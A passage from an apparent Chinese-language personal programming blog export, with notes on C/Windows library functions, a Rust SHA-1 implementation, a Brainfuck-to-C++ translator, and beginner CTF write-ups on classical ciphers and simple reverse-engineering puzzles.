        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;p--&quot;</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;*p = *p + 1&quot;</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;*p = *p - 1&quot;</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;.&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;cout&lt;&lt;char(*p)&quot;</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;,&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;*p=getchar()&quot;</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;while(*p)&#123;&quot;</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;]&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#125;&quot;</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;
    &#125;
&#125;</code></pre>

<pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-type">char</span> c;
    <span class="hljs-keyword">while</span> (cin &gt;&gt; c) &#123;
        cout &lt;&lt; <span class="hljs-built_in">translate</span>(c);
        <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;[&#x27;</span>)cout &lt;&lt; <span class="hljs-string">&quot;;\n&quot;</span>;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>然后，我们只需要加几行代码，就可以直接执行上述C++代码</p>
<pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-type">char</span> arr[<span class="hljs-number">1000</span>] = &#123; <span class="hljs-number">0</span> &#125;;
    <span class="hljs-type">char</span>* p = arr+<span class="hljs-number">500</span>;
    <span class="hljs-comment">//input code</span>
&#125;
 
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-built_in">run</span>();
    <span class="hljs-built_in">freopen</span>(<span class="hljs-string">&quot;D:/out.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, stdout);
    <span class="hljs-type">char</span> c;
    <span class="hljs-keyword">while</span> (cin &gt;&gt; c) &#123;
        cout &lt;&lt; <span class="hljs-built_in">translate</span>(c);
        <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;[&#x27;</span>)cout &lt;&lt; <span class="hljs-string">&quot;;\n&quot;</span>;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

]]></content>
  </entry>
  <entry>
    <title>Heapcreate和Heapalloc</title>
    <url>/2023/02/23/heapcreate%E5%92%8Cheapalloc/</url>
    <content><![CDATA[<h2 id="HeapCreate"><a href="#HeapCreate" class="headerlink" title="HeapCreate()"></a>HeapCreate()</h2><p>这个函数创建一个只有调用进程才能访问的私有堆。进程从虚拟地址空间里保留出一个连续的块并且为这个块特定的初始部分分配物理空间。<br>返回值：<br>成功：一个指向新创建的堆的指针<br>失败：NULL<br>调用函数GetLastError获得更多的错误信息。<br>这个函数在调用进程里创建一个私有堆，进程可调用HeapAlloc函数分配内存空间。这些页在进程的虚拟空间内创建了一个块，在那里堆可以增长。<br>如果HeapAlloc函数请求的空间超过了现有的页的大小，如果物理空间足够的话，额外的空间将会从已保留的空间里增加。<br>只有创建私有堆的进程可以访问私有堆。<br>如果一个DLL（动态链接库）创建了一个私有堆，那么这个私有堆是在调用该DLL的进程的地址空间内，且仅该进程可访问。<br>系统会使用私有堆的一部分空间去储存堆的结构信息，所以，不是所有的堆内空间对进程来说是可用的。例如：HeapAlloc函数从一个最大大小为64KB的堆里申请64KB的空间，由于系统占用的一部分空间，这个请求通常会失败。</p>
<h2 id="HeapAlloc"><a href="#HeapAlloc" class="headerlink" title="HeapAlloc()"></a>HeapAlloc()</h2><p>返回值：<br>如果函数成功，则返回值是指向分配的内存块的指针。<br>如果函数失败并且您尚未指定HEAP_GENERATE_EXCEPTIONS，则返回值为 NULL。<br>如果函数失败并且您指定了HEAP_GENERATE_EXCEPTIONS，则该函数可能会生成下表中列出的任一异常。特定异常取决于堆损坏的性质。有关详细信息，请参阅 GetExceptionCode。<br>异常代码    描述<br>STATUS_NO_MEMORY    由于可用内存不足或堆损坏，分配尝试失败。<br>STATUS_ACCESS_VIOLATION    由于堆损坏或函数参数不正确，分配尝试失败。</p>
<p>如果函数失败，则不会调用 SetLastError。应用程序无法调用 GetLastError 以获取扩展的错误信息。</p>
]]></content>
  </entry>
  <entry>
    <title>itoa函数</title>
    <url>/2023/02/28/itoa%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>itoa 为c语言的一个函数。itoa 函数是一个广泛应用的，从非标准扩展到标准的C语言。它不能被移植，因为它不是标准定义下的C语言，但是，编译器通常在一个不遵循程式标准的模式下允许其通过header ，因为它是一个从逻辑对应到标准库的函数。itoa 取整数输入值，并将其转换为相应进制数字的字符串。</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>把一个整数转换为字符串</p>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>itoa(i ,num ,10 );<br>i —- 需要转换成字符串的数字<br>num —- 转换后保存字符串的变量<br>10 —- 转换数字的基数（即进制）。10就是说按10进制转换数字。还可以是2，8，16等等你喜欢的进制类型<br>返回值：指向num这个字符串的指针</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>itoa() 函数有3个参数：第一个参数是要转换的数字，第二个参数是要写入转换结果的目标字符串，第三个参数是转移数字时所用的基数(进制)。在上例中，转换基数为10，就意味着以10为转换进制。10：十进制；2：二进制…<br>itoa 并不是一个标准的C函数，它是Windows特有的，如果要写跨平台的程序，请用sprintf。<br>标准库中有sprintf，功能比这个更强，用法跟printf类似：<br>char str[255];<br>sprintf(str, “%x”, 100); //将100转为16进制表示的字符串。<br>下列函数也可以将相应类型的整数转换为字符串：</p>
<h2 id="其它函数"><a href="#其它函数" class="headerlink" title="其它函数"></a>其它函数</h2><p>char *ultoa(unsigned long value,char *string,int radix)<br>将无符号整型数value转换成字符串并返回该字符串,radix为转换时所用基数<br>char *ltoa(long value,char *string,int radix)<br>将长整型数value转换成字符串并返回该字符串,radix为转换时所用基数<br>char *itoa(int value,char *string,int radix)<br>将整数value转换成字串存入string,radix为转换所用基数.<br>double atof(char *nptr)<br>将字符串nptr转换成双精度数,并返回这个数,错误返回0<br>int atoi(char *nptr)<br>将字符串nptr转换成整型数, 并返回这个数,错误返回0<br>long atol(char *nptr)<br>将字符串nptr转换成长整型数,并返回这个数,错误返回0<br>double strtod(char *str,char **endptr)<br>将字符串str转换成双精度数,并返回这个数,<br>long strtol(char *str,char **endptr,int base)<br>将字符串str转换成长整型数, 并返回这个数,</p>
]]></content>
  </entry>
  <entry>
    <title>memset()函数</title>
    <url>/2023/02/23/memset%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="memset函数"><a href="#memset函数" class="headerlink" title="memset函数"></a>memset函数</h1><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>C 库函数 void *memset(void *str, int c, size_t n) 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。</p>
<h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>下面是memset函数的声明</p>
<pre><code class="hljs bash">void *memset(void *str, int c, size_t n)</code></pre>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
<li><strong>str</strong>   –指向要填充的内存块</li>
<li><strong>c</strong>  –要被设置的值。该值以 int 形式传递，但是函数在填充内存块时是使用该值的无符号字符形式</li>
<li><strong>n</strong>  –要被设置为该值的字符数</li>
</ul>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>该值返回一个指向存储区 str 的指针</p>
]]></content>
  </entry>
  <entry>
    <title>sha1算法</title>
    <url>/2023/03/09/sha1%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>sha1算法又名<strong>哈希算法</strong></p>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>SHA-1（Secure Hash Algorithm 1）是一种密码散列函数，美国国家安全局设计，并由美国国家标准技术研究所（NIST）发布为联邦资料处理标准（FIPS）。SHA-1可以生成一个被称为消息摘要的160位（20字节）散列值，散列值通常的呈现形式为40个十六进制数。</p>
<h4 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h4><h5 id="消息填充-Message-Padding"><a href="#消息填充-Message-Padding" class="headerlink" title="消息填充(Message Padding)"></a>消息填充(Message Padding)</h5><h5 id="步骤一-数据填充-Append-Padding-Bits"><a href="#步骤一-数据填充-Append-Padding-Bits" class="headerlink" title="步骤一: 数据填充(Append Padding Bits)"></a>步骤一: 数据填充(Append Padding Bits)</h5><p>SHA-1是按照分块进行处理的，分块长度为512bit, 大多数情况下，数据的长度不会恰好满足是512的整数倍，因此需要进行「padding」到给定的长度。<br><strong>「填充规则」:</strong> 原始明文消息的b位之后补100…, 直到满足b + paddingLength % 512 = 448, 那如果b % 512在[448, 512(0)]之间呢，则在增加一个分块，按照前面的规则填充即可。</p>
<h5 id="长度填充"><a href="#长度填充" class="headerlink" title="长度填充"></a>长度填充</h5><p>之前说了，需要满足b + paddingLength % 512 = 448， 那么对于最后一个分块，就还剩512 - 448 = 64 bit 这剩下的64bit存放的是原始消息的长度，也就是b。「SHA-1」最多可以处理明文长度小于等于2^64 bit的数据。<br><img src="https://img-blog.csdnimg.cn/10238576ec144c1b9fbb24a138939a86.png#pic_center" alt="在这里插入图片描述"></p>
<h6 id="计算摘要-Computing-the-Message-Digest"><a href="#计算摘要-Computing-the-Message-Digest" class="headerlink" title="计算摘要(Computing the Message Digest)"></a>计算摘要(Computing the Message Digest)</h6><p><img src="https://img-blog.csdnimg.cn/a78d64fa7a0a4d08895c189a4af6a9bf.png" alt="在这里插入图片描述"><br>首先, 初始化5个常量, 如下所示, 类比于「MD5」可以看做是「MDBuffer」:</p>
<blockquote>
<p>H0 = 0x67452301<br>H1 = 0xEFCDAB89<br>H2 = 0x98BADCFE<br>H3 = 0x10325476<br>H4 = 0xC3D2E1F0</p>
</blockquote>
<p>然后对于消息按照如下的方式进行处理:</p>
<ul>
<li>前16个字节([0, 15])，转换成32位无符号整数。</li>
<li>对于后面的字节([16, 79])按照下面的公式进行处理</li>
</ul>
<blockquote>
<p>W(t) = S^1(W(t-3) XOR W(t-8) XOR W(t-14) XOR W(t-16))</p>
</blockquote>
<ul>
<li>令A = H0, B = H1, C = H2, D = H3, E = H4</li>
<li>做如下80轮的散列操作</li>
</ul>
<blockquote>
<p>TEMP = S^5(A) + f(t;B,C,D) + E + W(t) + K(t);<br>E = D;<br>D = C;<br>C = S^30(B);<br>B = A;<br>A = TEMP;</p>
</blockquote>
<ul>
<li>令H0 = H0 + A, H1 = H1 + B, H2 = H2 + C, H3 = H3 + D, H4 = H4 + E<br>解释一下，其中f函数如下:</li>
</ul>
<blockquote>
<p>f(t;B,C,D) = (B AND C) OR ((NOT B) AND D)         ( 0 &lt;= t &lt;= 19)<br>f(t;B,C,D) = B XOR C XOR D                        (20 &lt;= t &lt;= 39)<br>f(t;B,C,D) = (B AND C) OR (B AND D) OR (C AND D)  (40 &lt;= t &lt;= 59)<br>f(t;B,C,D) = B XOR C XOR D                        (60 &lt;= t &lt;= 79)</p>
</blockquote>
<p>k函数如下：</p>
<blockquote>
<p>K(t) = 0x5A827999         ( 0 &lt;= t &lt;= 19)<br>K(t) = 0x6ED9EBA1         (20 &lt;= t &lt;= 39)<br>K(t) = 0x8F1BBCDC         (40 &lt;= t &lt;= 59)<br>K(t) = 0xCA62C1D6         (60 &lt;= t &lt;= 79)</p>
</blockquote>
<h6 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h6><p>最后H0~H4即为最终「SHA-1」的输出结果。</p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><pre><code class="hljs html">pub struct SHA1 &#123;&#125;

impl SHA1 &#123;
    fn padding(message: &amp;[u8]) -&gt; Vec<span class="hljs-tag">&lt;<span class="hljs-name">u8</span>&gt;</span> &#123;
        let mut result = message.to_owned();
        // padding 1
        result.push(0x80);
        // padding 0
        while ((result.len() * 8) + 64) % 512 != 0 &#123;
            result.push(0b00000000);
        &#125;
        // padding message length 注意这里和MD5不同，没仔细看踩了一个大坑 这里长度padding到前面
        for byte in &amp;((message.len() * 8) as u64).to_be_bytes() &#123;
            result.push(*byte);
        &#125;
        return result;
    &#125;

    fn k(t: usize) -&gt; u32 &#123;
        match t &#123;
            n if n &lt; 20 =&gt; 0x5A827999,
            n if 20 &lt;= n &amp;&amp; n &lt; 40 =&gt; 0x6ED9EBA1,
            n if 40 &lt;= n &amp;&amp; n &lt; 60 =&gt; 0x8F1BBCDC,
            n if 60 &lt;= n &amp;&amp; n &lt; 80 =&gt; 0xCA62C1D6,
            _ =&gt; 0,
        &#125;
    &#125;

    fn f(t: usize, b: u32, c: u32, d: u32) -&gt; u32 &#123;
        match t &#123;
            n if n &lt; 20 =&gt; (b &amp; c) | ((!b) &amp; d),
            n if 20 &lt;= n &amp;&amp; n &lt; 40 =&gt; b ^ c ^ d,
            n if 40 &lt;= n &amp;&amp; n &lt; 60 =&gt; (b &amp; c) | (b &amp; d) | (c &amp; d),
            n if 60 &lt;= n &amp;&amp; n &lt; 80 =&gt; b ^ c ^ d,
            _ =&gt; 0,
        &#125;
    &#125;

    pub fn hash(message: &amp;[u8]) -&gt; String &#123;
        let padding_message = SHA1::padding(message);
        let mut buf: [u32; 5]; // Buffer one, A..E
        let mut h: [u32; 5] = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0];
        let mut w = [0u32; 80]; // Sequance of W(0)..W(79)
        let mut temp: u32;

        for chunk in padding_message.chunks(64) &#123;
            // 注意这里用的是big-edition
            let m: Vec<span class="hljs-tag">&lt;<span class="hljs-name">u32</span>&gt;</span> = chunk.chunks(4).map(|i| &#123;
                ((i[0] as u32) &lt;&lt; 24) | ((i[1] as u32) &lt;&lt; 16) | ((i[2] as u32) &lt;&lt; 8) | ((i[3] as u32) &lt;&lt; 0)
            &#125;).collect();

            for i in 0..16 &#123;
                w[i] = m[i];
            &#125;

            for t in 16..80 &#123;
                // W(t) = S^1(W(t-3) XOR W(t-8) XOR W(t-14) XOR W(t-16)).
                w[t] = (w[t - 3] ^ w[t - 8] ^ w[t - 14] ^ w[t - 16]).rotate_left(1);
            &#125;

            buf = h;

            for t in 0..80 &#123;
                // TEMP = S^5(A) + f(t;B,C,D) + E + W(t) + K(t);
                temp = buf[0].rotate_left(5).wrapping_add(
                    SHA1::f(t, buf[1], buf[2], buf[3])
                        .wrapping_add(buf[4].wrapping_add(w[t].wrapping_add(SHA1::k(t)))),
                );
                buf[4] = buf[3]; // E = D
                buf[3] = buf[2]; // D = C
                buf[2] = buf[1].rotate_left(30); // C = S^30(B)
                buf[1] = buf[0]; // B = A
                buf[0] = temp; // A = TEMP
            &#125;

            for i in 0..5 &#123;
                h[i] = h[i].wrapping_add(buf[i]);
            &#125;
        &#125;

        // output
        return String::from(format!(
            &quot;&#123;:08x&#125;&#123;:08x&#125;&#123;:08x&#125;&#123;:08x&#125;&#123;:08x&#125;&quot;,
            h[0], h[1], h[2], h[3], h[4]
        ));
    &#125;
&#125;


#[cfg(test)]
mod test &#123;
    use crate::sha1::SHA1;

    #[test]
    fn test() &#123;
        println!(&quot;sha1([empty string]) = &#123;&#125;&quot;, SHA1::hash(&quot;&quot;.as_bytes()));
        println!(&quot;sha1([The quick brown fox jumps over the lazy dog]) = &#123;&#125;&quot;, SHA1::hash(&quot;The quick brown fox jumps over the lazy dog&quot;.as_bytes()));
    &#125;
&#125;</code></pre>

<h6 id="在线SHA-1加密工具"><a href="#在线SHA-1加密工具" class="headerlink" title="在线SHA-1加密工具"></a>在线SHA-1加密工具</h6><p><a href="https://uutool.cn/sha1/">https://uutool.cn/sha1/</a></p>
]]></content>
  </entry>
  <entry>
    <title>system()函数</title>
    <url>/2023/03/09/system()%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><p>包含在头文件 “stdlib.h” 中</p>
<blockquote>
<p>int system(const char *command)</p>
</blockquote>
<h3 id="函数描述"><a href="#函数描述" class="headerlink" title="函数描述"></a>函数描述</h3><p>C 库函数 int system(const char *command) 把 command 指定的命令名称或程序名称传给要被命令处理器执行的主机环境，并在命令完成后返回。</p>
<h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><p>命令执行成功返回0，执行失败返回-1。</p>
<h3 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h3><p>执行 dos(windows系统) 或 shell(Linux/Unix系统) 命令，参数字符串command为命令名。另，在windows系统下参数字符串不区分大小写。</p>
<ul>
<li>说明：在windows系统中，system函数直接在控制台调用一个command命令。<br>在Linux/Unix系统中，system函数会调用fork函数产生子进程，由子进程来执行command命令，命令执行完后随即返回原调用的进程。<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4>一些system()函数的参数及实现的功能<br>表格里的内容可以通过 system(“HELP”);语句获取。<br><img src="https://img-blog.csdnimg.cn/bb68d0846b85442cb565ba9866ea98b1.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c9ef07eda9664e4fa31f997d77546789.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6672722285434a9d8d1361ca68586bc6.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a9d38b782c864c97ab08f2ae8a0414b0.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4bc331b6ef8b4746bb59cdb8b2196847.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/274611ecbe3841e3a30b1f4e4e2714a0.png#pic_center" alt="在这里插入图片描述"></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/1ced2ae69d624ac09ffd0f25f40a4f17.png#pic_center" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>刷题记录crypto</title>
    <url>/2023/03/24/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95crypto/</url>
    <content><![CDATA[<p>攻防世界<br>crypto</p>
<h1 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h1><p>附件为ccehgyaefnpeoobe{lcirg}epriec_ora_g<br>发现为栅栏密码<br>通过查找学习知道了这是W型栅栏密码<br>那么有一种叫做WWW的变种<br>1 2 3 4 5 6 # key=3 Rail-fence Cipher<br>1 . . . 5 . ↘　　　　 　↗ ↘<br>. 2 . 4 . 6　　　　↘　　 ↗<br>. . 3 . . .　　　　 ↘ ↗<br>结果为 1 5 2 4 6 3<br><strong>PS</strong>:WWW型的加密密钥就不只能是字符串长度的因子，小于其长度的任何一个数都可能是其key值，所以第一步也是确定密钥。<br>本题密钥为5<br>用在线W型栅栏解密<br><img src="https://img-blog.csdnimg.cn/6d741888d2c449f2a3509968bd70a228.png#pic_center" alt="在这里插入图片描述"><br>得到flag为cyberpeace{railfence_cipher_gogogo}</p>
<h1 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h1><p>附件为8842101220480224404014224202480122<br>题目中说答案为八位大写数字<br>所以要把文件中的数字分为8组，按0位间隔正好8组</p>
<blockquote>
<p>88421 0122 048 02244 04 0142242 0248 0122</p>
</blockquote>
<p>23         5       12    12      4      15        14      5<br>W          E            L      L       D       O         N      E<br>最终flag为cyberpeace{WELLDONE}</p>
<h1 id="不仅仅是morse"><a href="#不仅仅是morse" class="headerlink" title="不仅仅是morse"></a>不仅仅是morse</h1><p>打开附件看到</p>
<blockquote>
<p>–/.-/-.–/..–.-/-…/./..–.-/…./.-/…-/./..–.-/.-/-./—/-/…././.-./..–.-/-.././-.-./—/-.././…./…./…./…./.-/.-/.-/.-/.-/-…/.-/.-/-…/-…/-…/.-/.-/-…/-…/.-/.-/.-/.-/.-/.-/.-/.-/-…/.-/.-/-…/.-/-…/.-/.-/.-/.-/.-/.-/.-/-…/-…/.-/-…/.-/.-/.-/-…/-…/.-/.-/.-/-…/-…/.-/.-/-…/.-/.-/.-/.-/-…/.-/-…/.-/.-/-…/.-/.-/.-/-…/-…/.-/-…/.-/.-/.-/-…/.-/.-/.-/-…/.-/.-/-…/.-/-…/-…/.-/.-/-…/-…/-…/.-/-…/.-/.-/.-/-…/.-/-…/.-/-…/-…/.-/.-/.-/-…/-…/.-/-…/.-/.-/.-/-…/.-/.-/-…/.-/.-/-…/.-/.-/.-/.-/-…/-…/.-/-…/-…/.-/.-/-…/-…/.-/.-/-…/.-/.-/-…/.-/.-/.-/-…/.-/.-/-…/.-/.-/-…/.-/.-/-…/.-/-…/.-/.-/-…/-…/.-/-…/.-/.-/.-/.-/-…/-…/.-/-…/.-/.-/-…/-…/.-</p>
</blockquote>
<p>用在线morse解密得到<br><img src="https://img-blog.csdnimg.cn/e999fe38646b4094bba2c580b82d49b7.png#pic_center" alt="在这里插入图片描述"><br>可能存在另一种加密方式<br>删除提示用在线培根密码解密得<br><img src="https://img-blog.csdnimg.cn/6b2dd8629ef4487ebf4d61ce9f336c2e.png#pic_center" alt="在这里插入图片描述"><br>按照要求最终flag为cyberpeace{attackanddefenceworldisinteresting}</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录crypto2</title>
    <url>/2023/09/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95crypto2/</url>
    <content><![CDATA[<p>BUUCTF crypto<br>这篇里面的密码学都是非常非常简单的，基本上一步解密就能得到，目的是能够多的了解到密码加密方式，这样之后见到密码题能有一定的思路</p>
<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p>下载附件，打开后用MD5解密网站直接进行解密，得到flag</p>
<h1 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h1><p>见过几次应该一眼就能看出来题干中用的是base64加密方式进行的加密结果，故用base64解密网站进行解密即可得到flag</p>
<h1 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h1><p>看题目名称就可以知道这道题要用url解密，因此得到flag</p>
<h1 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h1><p>首先打开确实没想到是什么加密，但看密文很明确就是flag的字样，synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}，发现s和f相差13，y和l也相差13，后两位也是相差13，知道是凯撒密码，偏移量为13，解密得到flag</p>
<h1 id="摩斯"><a href="#摩斯" class="headerlink" title="摩斯"></a>摩斯</h1><p>在线摩斯密码解密得到flag</p>
<h1 id="password"><a href="#password" class="headerlink" title="password"></a>password</h1><p>这道题确实靠猜的，数了数key格式的位数恰好等于姓名加生日，因此猜测密码为zs19900315，最后包上flag即可</p>
<h1 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h1><p>刚看到这道题的时候没有什么思路，看了提示知道是将ASCII码和凯撒密码结合起来了<br><img src="https://img-blog.csdnimg.cn/aaae93c3ef7047d59820f11ef71121da.png" alt="在这里插入图片描述"><br>根据ASCII码对应来看，已知flag对应afZ_<br>f–102，a–97  两者相差5<br>l–108，f–102 两者相差6<br>a–97，Z–90 两者相差7<br>g–103，_–95 两者相差8<br>可以推得偏移量依次加一，由此可以得到flag</p>
<h1 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h1><p>首先题目名称意思是可引用-可打印的，它是多用途互联网邮件扩展（MIME) 一种实现方式<br>解密网站：<a href="http://www.metools.info/code/quotedprintable231.html">http://www.metools.info/code/quotedprintable231.html</a><br><strong>Quoted-Printable编码方法</strong><br>任何一个8位的字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值.例如，ASCII码换页符（十进制值为12）可以表示为”=0C”, 等号”=”（十进制值为61）必须表示为”=3D”. 除了可打印ASCII字符与换行符以外，所有字符必须表示为这种格式.<br>所有可打印ASCII字符(十进制值的范围为33到126)可用ASCII字符编码来直接表示, 但是等号”=”(十进制值为61)不可以这样直接表示.ASCII的水平制表符(tab)与空格符, 十进制为9和32, 如果不出现在行尾则可以用其ASCII字符编码直接表示。如果这两个字符出现在行尾，必须QP编码表示为”=09″ (tab)或”=20″ (space).<br>如果数据中包含有意义的行结束标志，必须转换为ASCII回车(CR)换行(LF)序列，既不能用原来的ASCII字符也不能用QP编码的”=”转义字符序列。 相反，如果字节值13与10有其它的不是行结束的含义，它们必须QP编码为=0D与=0A.<br>quoted-printable编码的数据的每行长度不能超过76个字符. 为满足此要求又不改变被编码文本，在QP编码结果的每行末尾加上软换行(soft line break). 即在每行末尾加上一个”=”, 但并不会出现在解码得到的文本中.</p>
<pre><code class="hljs bash"><span class="hljs-keyword">function</span> quoted_printable_encode(<span class="hljs-variable">$string</span>) &#123; 
    <span class="hljs-built_in">return</span> preg_replace(<span class="hljs-string">&#x27;/[^\r\n]&#123;73&#125;[^=\r\n]&#123;2&#125;/&#x27;</span>, <span class="hljs-string">&quot;<span class="hljs-variable">$0</span>=\r\n&quot;</span>, str_replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>,
rawurlencode(<span class="hljs-variable">$string</span>))); 
&#125;</code></pre>

<p>一个函数就可以，将所有字符串urlencode转换后，%号替换为”=”号，然后对非\r\n超过73连续字符，后面加一个=\r\n。这个是简单实现方法！ 按照该编码详细说明里面，有些空格、换行，还有一些特殊字符可以不用转换。不过一起转换了，也不会有影响！<br>PHP中可以使用下面1对函数进行编码和解码：</p>
<blockquote>
<p>quoted_printable_encode() 函数把 8 位字符串转换为 quoted-printable 字符串。<br>quoted_printable_decode() 对经过 quoted-printable 编码后的字符串进行解码，返回 8 位的 ASCII 字符串</p>
</blockquote>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录reverse</title>
    <url>/2023/02/27/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse/</url>
    <content><![CDATA[<p>攻防世界<br>reverse</p>
<h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>拖入exe<br><img src="https://img-blog.csdnimg.cn/33a7b6b7487d440aaae31200446f117e.png#pic_center" alt="在这里插入图片描述"></p>
<p>发现无壳并拖入64位IDA<br>F5反汇编<br>‘R’键将数字转换成字符串<br><img src="https://img-blog.csdnimg.cn/1dfd3cf2f3044f71a61f43e9385f9c3d.png" alt="在这里插入图片描述"><br>可以知道控制方向键的分别为“O”，“o”，“.”，“0”<br>判断分别代表什么方向：<br><img src="https://img-blog.csdnimg.cn/0c3a343474674e78bb7c6e2162975f43.png#pic_center" alt="在这里插入图片描述"><br>左减右加，上减下加<br>O左移 o右移 .上移 0下移<br>判断迷宫的x轴和y轴<br><img src="https://img-blog.csdnimg.cn/9ee7e111dce7434b8b93d7f9665e8286.png#pic_center" alt="在这里插入图片描述"><br>所以迷宫的起点就是（0，0）</p>
<p>sub_400690函数中是a2+a3*8,即a3表示行，a2表示列<br>a3 通过edx传递<br>a2 通过esi传递<br>行×8？再去看这个字符串，发现是64位，正好就是8×8<br>双击asc_601060查看字符串<br>用记事本整理得迷宫图形</p>
<pre><code class="hljs bash">  ******
*   *  *
*** * **
**  * **
*  *<span class="hljs-comment">#  *</span>
** *** *
**     *
********
</code></pre>
<p>*是边界，空格是通路，＃号是终点。<br>O是左移，o是右移，0是下移，.是上移<br>得到flag为nctf{o0oo00O000oooo..OO}</p>
<h2 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h2><p>拖进exe，无壳，拖入32位IDA<br>F5反汇编<br><img src="https://img-blog.csdnimg.cn/4fd53107f60c45b5b54b7a7340406bbc.png#pic_center" alt="在这里插入图片描述"></p>
<p>没想到直接看到flag，SECCON{Welcome to the SECCON 2014 CTF!}，提交竟然是对的</p>
